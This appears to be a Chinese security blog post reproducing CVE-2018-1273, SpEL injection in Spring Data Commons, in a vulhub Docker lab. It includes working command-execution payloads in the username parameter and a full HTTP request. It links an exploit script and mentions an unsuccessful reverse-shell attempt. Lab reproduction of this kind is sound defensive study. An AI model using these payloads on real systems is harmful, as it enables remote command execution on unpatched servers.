---
layout: post
title: Spring Data Commons 远程命令执行漏洞
tags: Spring Data
categories: CVE-2018-1273
---

# Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）

## 漏洞描述

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。此漏洞产生于Spring Data Commons组件，Spring Data Commons是Spring Data下所有子项目共享的基础框架，适合各个子项目使用，支持跨数据库持久化。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8080/users`即可看到一个简单的注册页面

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946232270290.jpg)

在注册的时候抓包，修改数据包，通过username参数利用Java执行命令

`username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946245943326.jpg)

```
POST /users?page=&size=5 HTTP/1.1
Host: your-ip:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: http://your-ip:8080
Connection: close
Referer: http://youp-ip:8080/users
Content-Type: application/x-www-form-urlencoded

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=123456&repeatedPassword=123456
```

进入容器查看，创建成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946239205809.jpg)

也可以用以下payload

`username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('touch /tmp/success')")]=`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946253492780.jpg)

创建成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946255318627.jpg)

使用[exploit](https://github.com/zhzyker/exphub/blob/master/spring/cve-2018-1273_cmd.py)执行命令

地址<https://github.com/zhzyker/exphub/blob/master/spring/cve-2018-1273_cmd.py>

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946282416173.jpg)

创建成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946282758928.jpg)

对于有回显的验证可以用ping来证明

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946288804309.jpg)

由于反弹shell通过java执行命令需要base64编码，编码后的payload中带有==，与数据包中的参数=可能有冲突，一直无法成功，暂未解决

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2018-1273/15946292521570.jpg)

## 受影响版本

Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)

Spring Data REST 2.6 – 2.6.10 (Ingalls SR10)

Spring Data Commons 2.0 – 2.0.5 (Kay SR5)

Spring Data REST 3.0 – 3.0.5 (Kay SR5)

Old versions that are not officially supported by the government

## 参考链接

https://xz.aliyun.com/t/2269